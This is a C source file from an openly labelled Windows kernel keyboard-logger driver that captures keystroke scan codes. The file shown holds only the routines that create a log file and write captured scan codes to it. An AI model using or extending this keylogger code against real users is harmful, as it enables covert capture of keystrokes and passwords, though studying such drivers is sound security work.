/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This is a simple keyboard device filter that attaches itself to the kbclass
 *   and gleams scan codes from the IRP as they pass up the stack.
 *
 *   This file handles all the disk file related functions.
 *
 *   REFERENCE for this code :
 *    Programing the Microsoft Windows Driver Model - Walter Oney : ISBN 0-7356-1803-8
 *    kbfilter.c - DDK
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *    KLog 1.0 - http://www.rootkit.com/
 */

#include "kdl.h"
#include "kdlfile.h"

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Create out log file to hold the scan codes with have recieved.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID CreateLogFile( IN PDEVICE_OBJECT theDeviceObject, OBJECT_ATTRIBUTES ObjectAttributes )
{

NTSTATUS            Status;
IO_STATUS_BLOCK     IOStatus;
PDEVICE_EXTENSION   theDeviceExtension;


   theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;

	// Open our log file or create it if necessary
	Status = ZwCreateFile( &theDeviceExtension->LogFile,  // FileHandle
                           SYNCHRONIZE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA,// DesiredAccess 
						   &ObjectAttributes,             // ObjectAttributes
						   &IOStatus,                     // IoStatusBlock 
						   NULL,                          // AllocationSize 
						   FILE_ATTRIBUTE_NORMAL,         // FileAttributes
                           0,                             // ShareAccess
						   FILE_OPEN_IF,                  // CreateDisposition
						   FILE_SYNCHRONOUS_IO_NONALERT,  // CreateOptions
						   NULL,                          // EaBuffer
						   0 );                           // EaLength
		
	// Error catch for no file logging access
	if ( Status != STATUS_SUCCESS )
	{
/* 
 If we have failed to create or append a log file?
 Should we unload the driver?
 Attempt the file agian?
 Need to figure out a plan of action to take here
 */
KdPrint( ("Failed ZwCreateFile() in CreateLogFile()\n") );
	}


#if DBG
	switch ( IOStatus.Status )
	{ 
	case FILE_CREATED:
		{
KdPrint( ("FILE_CREATED.\n") );
          break;
		}
	case FILE_OPENED:
		{
KdPrint( ("FILE_OPENED.\n") );
          break;
		}
	case FILE_OVERWRITTEN:
		{
KdPrint( ("FILE_OVERWRITTEN.\n") );
          break;
		}
	case FILE_SUPERSEDED:
		{
KdPrint( ("FILE_SUPERSEDED.\n") );
          break;
		}
	case FILE_EXISTS:
		{
KdPrint( ("FILE_EXISTS.\n") );
          break;
		}
	case FILE_DOES_NOT_EXIST:
		{
KdPrint( ("FILE_DOES_NOT_EXIST.\n") );
			break;
		}
	default :
		{
KdPrint( ("DEFAULT IO_STATUS_BLOCK.\n") );
          break;
		}
	} // End switch ( IOStatus.Status )
#endif

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID WriteDataFile(  PDEVICE_EXTENSION theDeviceExtension )
{

NTSTATUS          Status;
IO_STATUS_BLOCK   IOStatus;

KdPrint( ("KDL: WriteDataFile() (%d) [%s].\n", strlen( theDeviceExtension->WriteBuffer ),
		                                       theDeviceExtension->WriteBuffer ) );

    // Write our formated string out to the log file
    Status = ZwWriteFile( theDeviceExtension->LogFile,              // FileHandle
                          NULL,                                     // Event
						  NULL,                                     // ApcRoutine
						  NULL,                                     // ApcContext
					      &IOStatus,                                // IoStatusBlock
						  theDeviceExtension->WriteBuffer,          // Buffer
						  strlen( theDeviceExtension->WriteBuffer ),// Length
						  &theDeviceExtension->theEOF,              // ByteOffset
						  NULL );                                   // Key

#if DBG
    // Error catch if we had a problem with the file handle
	if ( Status != STATUS_SUCCESS )
   {
KdPrint( ("FAILED FILE WRITE 0x%x\n",Status) );
   }
#endif

}